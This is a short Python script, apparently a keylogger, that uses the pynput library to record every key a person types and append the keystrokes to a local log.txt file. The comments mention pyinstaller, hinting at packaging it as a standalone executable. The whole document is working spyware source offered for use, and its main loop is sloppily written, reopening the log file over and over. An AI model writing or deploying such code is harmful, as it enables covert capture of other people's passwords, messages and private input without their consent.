# Libraries installed:
# pip install pynput
# pip install pyinstaller

from pynput import keyboard

def on_release(key):
    print(key)
    if  key == keyboard.Key.space:
        key = " "
    elif key == keyboard.Key.enter:
        key = "\n"
    elif key == keyboard.Key.backspace:
        key = "[BACKSPACE]"
    elif key == keyboard.Key.shift:
        key = ""
    elif key == keyboard.Key.ctrl_l:
        key = ""
    elif key == keyboard.Key.cmd:
        key = ""
    elif key == keyboard.Key.num_lock:
        key = ""
    elif key == keyboard.Key.ctrl_r:
        key = ""
    elif key == keyboard.Key.menu:
        key = ""
    elif key == keyboard.Key.alt_gr:
        key = ""
    elif key == keyboard.Key.alt:
        key = ""
    elif key == keyboard.Key.ctrl:
        key = ""
    f.write(str(key).replace("'", ""))

# Start the keylogger or keyboard listener
listener = keyboard.Listener(on_release=on_release)
listener.start()

# Keep the code running
while True:
    i = 0

    # Log the keyboard listener to a txt file
    f = open("log.txt", "a")